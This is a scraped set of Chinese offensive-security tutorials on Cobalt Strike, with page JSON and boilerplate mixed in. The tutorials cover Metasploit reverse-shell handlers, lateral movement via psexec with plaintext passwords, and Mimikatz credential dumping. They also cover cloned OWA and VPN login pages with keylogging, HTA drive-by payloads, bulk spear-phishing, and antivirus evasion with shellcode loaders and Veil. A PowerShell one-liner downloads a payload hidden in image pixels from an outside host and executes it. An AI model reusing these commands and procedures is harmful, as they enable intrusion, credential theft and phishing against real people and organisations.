会明显感觉有些慢,另外,这样做的好处就在于,不会轻易的把 beacon shell 给搞掉,更保险一点,实际效果如下 msf5 > use exploit/multi/handler msf5 > set payload windows/meterpreter/reverse_http msf5 > set lhost 192.168.3.57 msf5 > set lport 8081 msf5 > set exitonsession false msf5 > exploit -j msf5 > sessions -i 1 meterpreter > sysinfo meterpreter > getuid 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 14:32:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/12.html":{"url":"Tools/Cobalt Strike/12.html","title":"windows/foreign/reverse_tcp [ 反向 tcp 外部监听器 ]","keywords":"","body":"windows/foreign/reverse_tcp [ 反向 tcp 外部监听器 ] 跟上面差不多,只不过这次换了下协议而已,首先,还是先把本地和 vps 之间的 ssh 隧道打通,具体操作如下 # ssh -C -f -N -g -R 0.0.0.0:110:192.168.3.57:110 root@45.63.121.57 -p 22 # ps -ef | grep \"192.168.3.57\" 而后,创建一个 reverse_tcp 的外部监听器 继续使用派生功能,将其派生到 reverse_tcp 这个外部监听器上 稍等片刻,便会看到本地 msf 的 meterpreter 上线,注意,此处外部监听器用的是 tcp 的 110 端口,那么你后面的 meterpreter payload 也一定要用 tcp 的 110 端口,这样数据才能正常对接交换 msf5 > use exploit/multi/handler msf5 > set payload windows/meterpreter/reverse_tcp msf5 > set lhost 192.168.3.57 msf5 > set lport 110 msf5 > set exitonsession false msf5 > exploit -j msf5 > sessions -i 1 meterpreter > sysinfo meterpreter > getuid 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 14:33:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/13.html":{"url":"Tools/Cobalt Strike/13.html","title":"windows/beacon_smb/bind_pipe [ 一个专门为多层内网正向级联而设计的监听器 ]","keywords":"","body":"windows/beacon_smb/bind_pipe [ 一个专门为多层内网正向级联而设计的监听器 ] 先来假设这么一种场景,你当前已经拿到了目标内网中的一台机器的 beacon shell,然后又通过其它方式搞到了同内网下的另一台 windows 机器的本地 administrator 密码且这台机器的 smb[445 端口]能正常通,不幸的是,由于各种各样的原因限制,那台 windows 机器并不能正常访问外网,也就是说没法再正常的反弹 beacon shell 了,那么前面那些反向监听器也就全都用不上了,而我现在就想通过当前仅有的这个beacon shell 能不能把内网那台不能正常访问外网的机器也一块给带出来呢? 答案是肯定的,bind_pipe 就是专为适应这种实战场景而设计的 首先,新建一个 bind_pipe 监听器,端口随意,其实端口用不用都无所谓,它是通过管道过去的,只要对方机器的 445 端口保持畅通就行,ip 保持默认即可 接着,通过 ipc 加上目标系统的本地 administrator 账号密码连到目标机器上,之后再用 beacon 内置的 psexec_psh 功能远程执行 powershell,此处唯一需要注意的就是,最后的那个监听器要选择上面创建的那个\"smb – bind\", 在此之后便可获得一个内网机器的正向 beacon,这就相当于把内网所有\"脱网\"机器的都挂到了当前这台机器上,然后一并给带出来,仔细看下那个链状标记,意思其实就是级联,具体如下 beacon> shell net use \\\\192.168.3.11\\admin$ /user:\"administrator\" \"Admin12345\" beacon> psexec_psh 192.168.3.11 smb - bind 直接远程执行 powershell payload,此处暂时不懂没关系 点击工具栏中耳机旁边的那个三点的形状,现在看的就非常清晰了,根据箭头指向,层级关系一目了然 smb bind 监听器还有个好处就是,不用的时候可以先把目标机器断开,用的时候再连上就行了,无非就是个 link,unlink 动作,这样可以尽可能渐少暴露面,实战中相对灵活些,另外,不得不说得是,所有的 bind都有个最大的问题就是目标系统各种防火墙的问题,如果目标系统直接阻断了 445 端口通信,很显然就 bind 不过去了,当然啦, payload 自身的免杀是另外一个问题, 注: beacon 内置的 psexec *系列功能实测较适用于 2008r2 之下的系统, 2012r2 之后的系统,很难 bind 成功 beacon> shell net use \\\\192.168.3.5\\admin$ /user:\"administrator\" \"admin\" beacon> psexec 192.168.3.5 admin$ smb - bind 不同于 psexec_psh 直接执行 powershell payload,psexec 是先把 exe payload 通过管道 copy 过去再执行 beacon> unlink 192.168.3.5 beacon> link 192.168.3.5 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 14:38:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/5.html":{"url":"Tools/Cobalt Strike/5.html","title":"Cobalt Strike 获取凭据","keywords":"","body":"Cobalt Strike 获取凭据 目标机器CobalStrike上线后，通常先抓取该主机凭据。 选择执行 Access–>Run Mimikatz ，或在Beacon中执行logonpasswords命令。需要当前会话为管理员权限，才能成功，如果权限低，请先提权~ 点击工具栏的Credentials，可以看到获取的凭据信息。（Credentials可自行添加） 不是每次都能成功获取到明文密码的，要看内存中是否存储。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 00:44:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/6.html":{"url":"Tools/Cobalt Strike/6.html","title":"Cobalt Strike psexec传递","keywords":"","body":"Cobalt Strike psexec传递 获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ） 使用portscan命令： ip网段 — ports端口 — 扫描协议（arp、icmp、none）— 线程（实战不要过高）。 beacon> portscan 192.168.144.0/24 445 arp 200 点击工具栏的View–>Targets，查看端口探测后的存活主机。（Targets可自行添加） 选择Login–>psexec传递登录。 选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。 在Beacon中可以看到执行的命令，并会显示成功登录的ip，之后就便会上线CobalStrike。这样就控制了多个主机的系统权限。 附：psexec密文传递Beacon中执行的命令。【不是psexec(psh)选项】 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 00:53:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/7.html":{"url":"Tools/Cobalt Strike/7.html","title":"Cobalt Strike Link Listener","keywords":"","body":"Cobalt Strike Link Listener 实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。 首先，在已上线的主机创建Listener，监听端口可自定义。 择 Attacks->Packages->Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。 注意，选择刚建立的Listener名字，Proxy可不设置，这里生成exe保存本地。(未免杀) 上传刚才生成的payload到当前已上线的目标机中，还需要上传另一个工具PsExec.exe 。（CobalStrike本身psexec功能不够强大，且方法不唯一） https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec 在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 beacon> shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe 端口查看，实际不出网目标机（192.168.144.196）是与出网目标机（192.168.144.155）正在建立连接。 beacon> shell netstat -ano |findstr 4444 因为这是link链接，只要主链路（即出网机Listener）掉线，就都会掉线！ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 01:03:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/8.html":{"url":"Tools/Cobalt Strike/8.html","title":"Cobalt Strike ssh登录","keywords":"","body":"Cobalt Strike SSH登录 ssh批量登录比较简单，同样利用当前已上线的目标机进行登录。 beacon> portscan 192.168.144.170-210 22 arp 200 在Credentials中添加ssh的口令信息。（ssh口令可事先通过其他方式获取，不建议用此工具进行ssh爆破，效率慢） 选择Login–>ssh登录。 选择刚添加的ssh口令，主机Session，即从哪台主机连接过去。 ssh成功登录后，就实现了Linux目标机的上线，在Beacon中可以看到执行的命令。若需要上线的Linux主机不多，可直接在Beacon中执行命令。 在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 01:11:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/18.html":{"url":"Tools/Cobalt Strike/18.html","title":"Cobalt Strike 探针","keywords":"","body":"Cobalt Strike 探针 关于探针 在开始正式的内容之前,我们不妨先来大致了解下,所谓的探针,到底是个什么东西,首先,来假设这么一种场景,比如,某天一个小偷想\"光顾\"下你们家, 既然是\"光顾\"那肯定不能选择有人在家的时候下手,怎么办确定你家到底有没有人在呢? 有个很简单的方式,比如,我去按下你家的门铃,但是按完之后,我立马就远远躲到某个角落里观察,听着到底有没有开门的动静儿,如果有,则说明此时家里有人,不太方便下手,如果陆陆续续敲了几次都发现没人开门,则说明家里很可能没人,这个时候下手就比较保险了,那么这个查点的过程实际上就是\"探针\"的核心作用 此时反过来将这种场景应用到我们实际渗透中,就很好理解了,比如,我现在需要明确的知道目标平时都喜欢用什么系统 详细版本是多少[win7,8 or 10],爱用什么浏览器,常用的办公软件又有哪些,有没有装flash,版本又是多少,再比如,现在想直接给目标发木马信,我们是不是需要事先明确知道,目标系统都用的什么杀软,这样后期才好针对性的做免杀,还有目标机器处在什么样的内网[一看 172 的内网段,极有可能就是在办公内网],出口 ip是多少,等等等...具体该怎么去拿到上面所说的这些目标信息呢,一种比较好的方式就是通过探针来搜集,说白点就是想办法让目标去点一下我们事先精心设计好的一个链接,通过伪造某个真实的网站链接,来变相搜集用户敏感信息,当然啦,CobaltStrike默认的探针能搜集的信息范围非常有限,所以如果你是想真正用于实战,这种东西建议大家最好还是直接自己写 探针的利用 第一步,先来看看如何利用 CobaltStrike 快速生成一个探针链接,如下,端口保持默认,重定向 url 选择真实网站 url,本地 url 尽量弄的和真实网站 url 像一点,总之,一眼看上去比较有迷惑性才行,最后,把最下面的使用 java applet 获取信息也勾上,因为用 java 获取的稍微更精准一点,没记错的话,默认应该是用 js 来获取的 完了之后点击 \"Attacks \" -> \" Web Drive-by\" -> \"Manage\" 便可找到刚刚生成好的探针链接 最终,生成的探针链接形式大致如下,由于此处仅为学习,所以用的直接是 ip,实战中肯定是要用自己的域名的 http://71.26.83.17/ 第二步,假如你就像现在这样直接把探针链接发给人家,别人一看肯定就会起疑心,更别说去点了,所以需要再用短地址稍微伪装下原本的探针链接才行,如下 https://bitly.com/ 类似的短地址生成站,还有非常多,大家请自行谷歌,境外目标就直接用境外的短地址生成站,境内的就直接用境内的一些短地址生成站,主要是速度快,不会有所察觉 https://bit.ly/2VUiklp8 第三步,就是想尽一切办法潜入目标群组,twitter,facebook,以及各种 QQ 群,朋友圈,站内信或者直接去搜集目标邮箱,总之,只要能把探针地址发给目标就行 [至于具体在实战中如何想办法跟目标搭上线,不是此处要关注的重点,也就不多啰嗦了],当目标一点这个地址,首先,它会通过短域名解析到我们自己的探针链接上,然后在探针链接上可能要停顿个一秒的样子再跳转到真实的网站链接上,如果此时目标网速够快的话,停顿的这个过程几乎是不会有太大感觉的 如下便是当目标正常点击了我们发给他的探针之后的效果,此时通过 CobaltStrike 可以清晰的看到获取的目标客户端的各种信息,比如, 公网,内网 ip [linux 系统可以获取到,windows系统获取的不太准确 ],以及所用浏览器,操作系统的 [ 这个识别的也不太准 ] 详细版本,当然啦,CobaltStrike 本身获取到的信息还是非常有限的,拿到了这些基础信息之后,我们便可以开始进一步针对性的调试自己的马以及其它的各种工具 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 23:36:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/19.html":{"url":"Tools/Cobalt Strike/19.html","title":"利用钓鱼页面来搜集目标各类 owa 入口账号密码","keywords":"","body":"利用钓鱼页面来搜集目标 owa 入口账号密码 用于演示的 owa 入口实例,如下: https://0-sec.org/owa/auth/logon.aspx?replaceCurrent=1&url=https%3A%2F%2Fhgcbizmail.hostedexchange.asia%2Fowa 原本的真网站长这个样子 既然是利用钓鱼页面来盗取账号密码,首先,肯定得先有个钓鱼页面才行,而在 CobaltStrike 中默认提供了一个 Clone Site 模块,就是专门用来干这事儿的,接着我们就来简单看下具体怎么用,其实非常简单,依次点击 \"Attacks\" -> \" Web Drive-by\" -> \" Clone Site\" 之后会弹出右边的对话框,在\"Clone URL\"中填上要克隆的页面的真实 url, \"Local URL\" 则是指定本地 url,这个尽量要和真实目标 url 保持像一点才行, \"Local Host\"保持默认, \"Local Port\" 保持默认, \"Attack\"的意思就是用指定的 CobaltStrike 链接[比如,选择我们之前生成的那个探针链接]去替换钓鱼页面中的所有链接[其实就是替换 a 标签中 href 的内容],这样不管目标点击钓鱼页面中的哪个链接时都会先跳到我们的恶意链接上,至于这个恶意链接是探针还是个木马下载链接,就完全看你的实际目的了,最后,记得把最下面的键盘记录选项也勾上,勾上这个以后,当目标访问我们的钓鱼页面从键盘上所输入的所有数据都会被回传至我们的 C2 服务器上,也正是通过这种方式来实现的实时键盘记录,其实本质就是用 js[不停捕捉键盘事件]回传的 最终生成好的钓鱼页面大概就是如下这个样子,之后的事情就是想办法把这个链接发给目标让他能看到点上就行 http://23.16.73.89/owa/auth/logon.aspx 这是我们克隆的假网站 在目标点开了我们发给他的钓鱼页面链接,正常输入账号密码之后,CobaltStrike 团队服务器马上就会接收到他所键入的数据,如下,此时他只要一点击登录,就会跳到原来真实的入口链接上,对于一个非专业人员来讲,他可能并不太会去特别注意那个 url 的跳转变化,可能他会觉得只是刚刚密码输错了而已,但其实我们此时已经成功拿到了他的密码,目的已达成 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-28 21:22:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/20.html":{"url":"Tools/Cobalt Strike/20.html","title":"利用钓鱼页面来搜集目标各类 vpn 入口账号密码","keywords":"","body":"利用钓鱼页面来搜集目标各类 vpn 入口账号密码 用于演示的 cisco vpn 入口实例,如下: https://www.0-sec.org/dana-na/auth/url_default/welcome.cgi 原本的真网站长这个样子 具体配置还是跟上面一模一样的流程,只不过这次换成了 vpn 入口的钓鱼页面 最终的 vpn 入口钓鱼页实际效果,如下 http://23.16.73.89:80/dana-na/auth/url_default/welcome.cgi 这是我们克隆的假网站 当目标正常访问钓鱼页面并输入账号密码后,我们这边正常捕捉到账号密码数据 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-28 21:18:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/21.html":{"url":"Tools/Cobalt Strike/21.html","title":"利用钓鱼页面来搜集目标各类 oa 入口账号密码","keywords":"","body":"利用钓鱼页面来搜集目标 oa 入口账号密码 用于演示的 oa 入口实例,如下: https://0-sec.org/oa/login 原本的真网站长这个样子 最终的 oa 入口钓鱼页效果,如下 http://23.16.73.89:80/oa/login 这是我们克隆的假网站 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-28 21:21:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/22.html":{"url":"Tools/Cobalt Strike/22.html","title":"Cobalt Strike 网页挂马","keywords":"","body":"Cobalt Strike 网页挂马 第一步,先准备好木马 [ 即 payload ] 链接 创建监听器 由于是网页挂马,所以此处我们就直接生成一个 hta 的 payload, \"Method \"选择用 \"PowerShell\" [ win7 之后的系统建议直接用\"powershell\"],默认的\"Executable\"是利用 vbs 执行 shellcode[这对于一些老系统也许还行,但对于 win7 之后的系统执行会有些问题] ,生成过程如下 接着,利用 CobaltStrike 自带的\"host file\" [ 其实就相当于 CobaltStrike 自带的一个 web 服务器 ] 功能,把刚刚生成好的 hta payload 挂上去,生成钓鱼链接,当然啦,你也可以不用 hta,利用前几天爆的那个 winrar的目录穿越漏洞挂个带马的 rar 压缩包上去也是一样的,都是一些实际利用思路,作为入门,我们大可先不用考虑那么多,还是那句话,先把工具走通,然后再学会变通,后面自然就游刃有余 最终生成的 payload 链接如下 http://71.26.83.17:80/update.hta 第二步,准备钓鱼页面 具体步骤还还跟之前一样,只不过,这里多了一点,需要你在\"Attack \"那里,选择刚刚上面生成的那个 payload 链接,因为我们的最终目的是要挂马 最终生成的钓鱼页面链接如下 http://23.16.73.89:80 第三步,想办法把这个 payload 链接发给目标 当目标一打开我们发给它的链接之后,就会自动提示下载 payload,实际效果如下 如果此时目标由于粗心或者误操作,万一真的就执行了我们的 hta payload,那后果可想而知,实战中,我们肯定也不会去直接用 bat,hta,vbs 或者 exe 之类的敏感后缀,现在是个浏览器都会弹个很醒目的框提示你风险,这样目标一看到很可能就不会去点了,实际上弄个压缩包都比这个好,当然啦,我们此处的目的还是为了让大家对一些基础钓鱼流程有个最简单的认知即可,照顾到一些新手朋友,暂时不去涉及的太多 特别注意,如果目标是像上面那样执行的 payload,那么弹回的这个 beacon shell 默认是没有被 bypassUAC 的,也就是说,接下来会有很多特权操作我们是没法做的,比如,抓个明文密码或者 hash,所以,得想办法先 bypass一下 UAC 才行,此处可以直接用 cobaltstrike 自带的 bypassUAC 功能来尝试弹回一个有真正管理权限的 beacon shell,当然啦,因为是入门学习,目标机器上没有任何防护杀毒,直接这样 bypas 就可以把 beacon 弹回来,但实战中,几乎是不可能的,杀软肯定会拦截类似的权限提升操作,弟兄们知道便可,先不用想那么多,如下 最后,我们不妨再来简单看下这个 hta payload 里到底都是些什么东西,如下已经很明显了,其实就是利用 vbs 来执行 powershell payload,跟我直接生成的 powershell payload 并没有太大差别 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-28 21:46:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/23.html":{"url":"Tools/Cobalt Strike/23.html","title":"Cobalt Strike 批量发送钓鱼邮件","keywords":"","body":"Cobalt Strike 批量发送钓鱼邮件 第一步,先准备好目标的邮箱列表 特别注意下此处的书写格式,前面是目标邮箱,后面紧跟着一个 TAB 键然后才是你想要的人名 # cat target.txt 第二步,开始准备邮件模板和带有 payload 的附件 这个邮件模板具体改怎么搞呢? 其实有个很简单的方法,就是你可以先用自己的 gmail 或者其它任意邮箱,把钓鱼邮件先写好,然后随便给自己的另外一个邮箱先发一封[ 注: 此处全部暂以 gmail 为例再操作 ],然后再把收到的这个邮件的源码给抠出来再稍微处理下就是钓鱼模板了,因为此处还要发钓鱼链接,所以我们需要事先把这个钓鱼链接也一并准备好,如何生成钓鱼链接就不多说了,之前的文章已有详细说明 最终生成的钓鱼链接如下 http://12.91.67.23:80/dana-na/auth/url_default/welcome.cgi 接下来的事情就很明了了,无非就是根据之前期搜集到的各种目标信息,想办法写钓鱼信,具体该怎么写,则要根据你自己的实际情况来,此处只是个简单的 demo,纯粹就是为了给弟兄们演示效果用的,切莫直接用于实战,写信的过程中唯一需要注意的就是, \"要显示的文本\" 那个地方要写真实的链接,而\" 链接到\" 则要写我们上面准备好的那个钓鱼链接,这样一来,只要不是专业人员看到这个链接都不会有太大的怀疑,写完信之后,把它发到我们的另一个 gmail 邮箱里 然后我们到另一个 gmail 邮箱去收信,看到的就是如下这个样子,当然啦,信内容确实比较简单,实战中也肯定不能这么干,此处主要目的还是为了快速给大家演示一下实际的发信效果,所以就没必要弄得那么精致了, 点击\"显示原始邮件\" 将原始邮件复制到剪切板上,因为我们后续还要再稍微处理下 处理过程也很简单,只需留下标题和正文就行,邮件头中的内容全部删掉即可,而后再将其另存为 txt,等会儿我们就用这个来作为发信模板 第三步,批量发送钓鱼信 在 cobaltStrike 中默认为我们提供了一个可用于批量发送钓鱼邮件的功能,即\"Spear Phish\",其实说白点,没啥实际的技术含量,无非就是要你指定一个 smtp 服务器的 ip,端口,一个有效的邮箱账号密码,然后就可以用这个邮件服务器来发信了,就这么简单,py 十来行代码足矣搞定,不同于之处就在于这个是用 java 写的,而且给你画了个好看的界面,看着更加友好易用了,仅此而已 大致介绍完咱们现在就来看下具体怎么去配置这个 smtp [ 因为是学习,此处我们就直接用 outlook 来发信,实战中你可以自己想办法去搭建邮件服务器来发,这样效果会相对更好一点,只是搭建油服的过程比较蛋疼一点]: Targets 选择上面准备好的那个目标邮箱列表文件 Template 选择上面准备好的那个钓鱼邮件模板 Attachment 选择带有 payload 的 rar 压缩包 [比如,可以用最近的 rar 目录穿越漏洞来搞] Embed URL 用上面准备好的那个钓鱼链接来替换邮件原文中所有 a 标签中的 href 地址 Mail server 指定用于发信的 smtp 服务器,因为此处我们是直接用 outlook 来发的,所以你只需指定 outlook smtp 域名,端口和你自己的 outlook 账号密码即可,当然啦,实战中肯定是要用匿名邮箱来发的,不可能直接用自己的 Bounce to 此处最好和你用于发信的那个邮箱完全保持一致,不然邮件可能发不出去 一切配置准备完毕之后,不妨先来预览\"Preview\"下邮件正文效果,看到如下,没什么问题,就可以尝试点击\"Sent\"了 以下便是邮件发送成功后的实际效果 最后,我们再到各个邮箱去看看,刚发的钓鱼邮件到底有没有正常过来,很显然,已全部正常到达目标收件箱,特别注意 是正常达到收件箱而非垃圾箱 从上面我们看到,邮件附件和链接都是正常到达目标收件箱的,不妨顺手点下那个链接试试看,如下,也正如我们预期的那样,正常跳到了我们的钓鱼页面上,至此,一次相对完整的钓鱼邮件发送过程基本就算完了,之后的事情就是再想办法将之前提到的探针,payload 链接一并整合利用起来,便是一次相对完整的钓鱼攻击过程了,ok,都比较简单,就不多废话了,弟兄们一点点灵活变通就好了,确实也没啥太多的难点在里面 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 12:01:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/24.html":{"url":"Tools/Cobalt Strike/24.html","title":"CobaltStrike beacon 免杀上线 [ Csharp ]","keywords":"","body":"Cobalt Strike beacon 免杀上线 [ Csharp ] 模拟目标环境: AV-Server 192.168.3.58 装有最新版 360 套装 [ 卫士 + 杀毒 ] 2008r2 64 位系统 首先,创建如下监听器 接着,再用上面的监听器生成 64 位 shellcode,因为目标是 64 位系统 最终生成的 shellcode 如下 # cat bypass.cs 然后开始替换 shellcodeLauncher.cs 文件中对应位置的 shellcode,注意那个字节长度要和上面的 shellcode 保持一一对应 之后,只需想办法将 shellcodeLauncher.cs 文件丢到目标机器上,再利用其自带的 csc[ 特别注意,此处也要用 64 位目录下的 csc 工具,csc 默认系统是没有的,需要目标机器装有.net 4.0 才行,不过服务器环境一般默认都会装的有] 编译生成对应的 exe payload,实战中记得把这个 exe 文件名改下,由于直接执行 exe payload 会被一直挂起,所以我们可以尝试利用系统计划任务直接弹回一个 system 权限的 beacon shell,有些朋友提到360 套装会拦截 schtasks,自己在实测中有时候拦了,有时候却没拦,暂时还不大清楚具体原因,虽然直接用 wmic 也可以执行,但 360 百分百会拦截 wmic.exe # C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /unsafe /out:shellcodeLauncher.exe shellcodeLauncher.cs # move shellcodeLauncher.exe c:\\Windows\\Temp # schtasks /create /RL HIGHEST /F /ru \"SYSTEM\" /tn \"WindowsUpdates\" /tr \"c:/Windows/Temp/shellcodeLauncher.exe\" /sc DAILY /mo 1 /ST 00:15 # schtasks /run /tn \"WindowsUpdates\" # schtasks /query | findstr \"WindowsUpdates\" # schtasks /delete /F /tn \"WindowsUpdates\" 最终,启动计划任务后,system 权限的 beacon shell 被正常弹回 beacon> sleep 0 beacon> shell tasklist | findstr /c:\"explorer.exe\" /c:\"360\" beacon> shell query user 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 12:53:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/25.html":{"url":"Tools/Cobalt Strike/25.html","title":"CobaltStrike beacon 免杀上线 [ Veil ]","keywords":"","body":"Cobalt Strike beacon 免杀上线 [ Veil ] 模拟目标环境: AV-Server 192.168.3.58 装有最新版 360 套装 [ 卫士 + 杀毒 ] 2008r2 64 位系统 第一步,创建监听器,生成 Veil 格式的 shellcode [ 关于 Veil 相信很多朋友都已经比较熟悉了,此处不多做介绍,大家可以直接去 github 里搜下,然后按步骤装上即可 ] 实际生成的 Shellcode 内容如下 紧接着,去启动 Veil [ 注: 此处的 Veil 是在我的另一台 kali 机器上 ], 选择 go shellcode 注入这个模块[ 之所以选 go,主要是因为它的免杀效果,相对于其它脚本稍好一点,顺便提醒一句,在安装 Veil 时最好先把系统挂上 vpn,防止某些包下不下来,导致整个安装过程出错,注意仔细观察安装过程,不然万一等装完,起不来都不知道是哪里的问题,非常简单,就不再多啰嗦了 ] # ./Veil.py Veil>: use 1 Veil/Evasion>: list Veil/Evasion>: use 17 上面的模块中不用做任何配置,全部保持默认,然后输入 \"generate \" ,此时选择\"3 \"[整篇文章最关键的地方也就在这里],自定义 shellcode,直接把我们之前用 CobaltStrike 生成好的那个 Veil shellcode 粘过来回车就行 [go/shellcode_inject/virtual>>]: generate 之后,便会自动开始打包生成对应的 exe payload 此时,我们只需想办法把上面生成的 exe payload 丢到目标机器上,用系统计划任务直接弹回一个高权限的 beacon shell 即可 # schtasks /create /RL HIGHEST /F /ru \"SYSTEM\" /tn \"WindowsUpdates\" /tr \"c:/Windows/Temp/update.exe\" /sc DAILY /mo 1 /ST 00:15 # schtasks /run /tn \"WindowsUpdates\" # schtasks /query | findstr \"WindowsUpdates\" # schtasks /delete /F /tn \"WindowsUpdates\" 最终,beacon shell 被正常弹回,如下 beacon> sleep 0 beacon> shell tasklist | findstr /c:\"explorer.exe\" /c:\"360\" beacon> shell query user 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 12:58:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/26.html":{"url":"Tools/Cobalt Strike/26.html","title":"Cobalt Strike beacon 免杀上线 [ Powershell ]","keywords":"","body":"Cobalt Strike beacon 免杀上线 [ Powershell ] 模拟目标环境: AV-Server 192.168.3.58 装有最新版 360 套装 [ 卫士 + 杀毒 ] 2008r2 64 位系统 第一步,创建监听器,并用对应的监听器生成的 \"Powershell payload \" 第二步,回到本地机器上,先准备好一张大点的图片,比如随便去找一张\"1920 * 1080\"的超清图,之所以要大点,主要是为了防止等会儿存不 payload,然后再借助\"Invoke-PSImage.ps1 \" 脚本将上面生成好的\"powershell payload\" 分散存到图片的各个像素中,并生成用于执行该 payload 的 powershell 代码,特别注意下那个 payload 图片链接,等会儿要把它替换成我们自己的,具体如下 此时,我们不妨来简单对比着看下存有 payload 的图片和原图的大小,由于是把 payload 分散存到图片的各个像素里,图片自身的体积也被瞬间撑大了数倍 第三步,将带有 payload 的图片挂到我们的 CobaltStrike \"web 服务器[host]\"上,生成如下链接,因为我们等会儿需要远程来加载这个链接以读取其中的 payload 并执行 第四步,去目标机器上准备执行 payload [ 全程无文件 ],此处注意,要先将用于执行 payload 的那段代码里的 payload 图片地址改成上面准备好的那个链接,如下 C:\\>powershell -exec bypass PS C:\\> sal a New-Object;Add-Type -AssemblyName \"System.Drawing\";$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(\"http://18.23.76.81:80/final.png\"));$o=a Byte[] 3840;(0..1)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3333])); 最终,当我们执行完那段powershell 代码便会看到beacon shell被正常弹回,当然啦,这儿还有个很大的问题就是,实战中,我们肯定不可能像这样直接在目标桌面里打开个cmd再进到powershell去执行payload,但我此时就是想执行那段 powershell payload 弹个 beacon 的 shell 回来操作,又该怎么办呢,有个比较简单的办法,就是可以配合 msf 一起,直接利用 payload/cmd/windows/powershell_reverse_tcp 模块免杀弹回个 ps 的 shell 来操作就好了,具体细节篇幅原因不再多说,非常简单,作为扩展,弟兄们可以抽空自行去实践 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 14:43:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/28.html":{"url":"Tools/Cobalt Strike/28.html","title":"Cobalt Strike beacon 免杀上线 [ com 劫持 ]","keywords":"","body":"Cobalt Strike beacon 免杀上线 [ com 劫持 ] 模拟目标环境: AV-Server 192.168.3.58 装有最新版 360 套装 [ 卫士 + 杀毒 ] 2008r2 64 位系统 第一步,既然是劫持 com,首先肯定得先有个 dll 